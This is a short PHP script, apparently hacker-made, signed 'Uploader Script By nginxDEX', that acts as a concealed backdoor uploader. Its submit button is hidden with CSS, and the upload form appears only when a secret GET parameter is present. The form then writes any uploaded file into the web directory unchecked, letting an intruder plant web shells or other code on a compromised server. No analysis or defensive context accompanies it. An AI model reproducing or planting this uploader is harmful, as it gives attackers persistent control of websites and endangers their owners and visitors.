<?php

echo'
<style>
.none{
	display:none;
}
</style>
<form method="get">
<input type="submit" name="x" class="none">
</form>';
if($_GET['x']){
if(isset($_POST['btn']))
{
	$nama= $_FILES['upl']['name'];
    $lokasi = $_FILES['upl']['tmp_name'];
	$folder="";
	if(move_uploaded_file($lokasi,$folder.$nama))
	{
echo'berhasil upload file :)';	}else{
		echo'gagal upload file :';
	}
}
echo'
<!-- Uploader Script By nginxDEX -->
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="keywords" content="Codename">
<meta name="viewport" content="width=width-device,initial-scale=1">
<link rel="icon" href="https://blog.rootshell.be/wp-content/uploads/2012/02/blackhat-nl.png">
<title>Uploader MnH-Blog</title>
</head>
<body>
 <link href="https://fonts.googleapis.com/css?family=Trade+Winds" rel="stylesheet" type="text/css"/>
<center>
<br><br><br><br><br><br><br>
<h1>#~nginxDEX~#</h1>

<fieldset><legend> Upload Here </legend>
<form action="" method="post" enctype="multipart/form-data">
<input type="file" name="upl"  />
<button type="submit" name="btn" id="btn">Upload !</button>
</form></div>
</fieldset>

<!-- INI CSS :) -->
<style>
body{
	background:#000;
text-align: center;
color:#00FF6D;
}
#kolom{
color:#00FF6D;
background: #555;
border:1px solid #71FF00;
Width:35%;
Height:80px;
font-family: Trade Winds;

}
#btn{
color:#000;
background: #00ff6d;
border: 0;
width:30%;
height:30px;
}
#btn:hover{
	transition-duration:0.4s;
-o-transition-duration:0.4s;
-moz-transition-duration:0.4s;
-webkit-transition-duration:0.4s;
background:#000;
border:1px solid #00ff7d;
color:#81ff00;
}
h1{
font-family:Trade Winds;
color:#333;
text-shadow:0pt 0pt 10pt #00FF5D,0pt 0pt 20pt #71FF00,0pt 0pt 30pt #00FF6D;
}

</style>';
}

?>
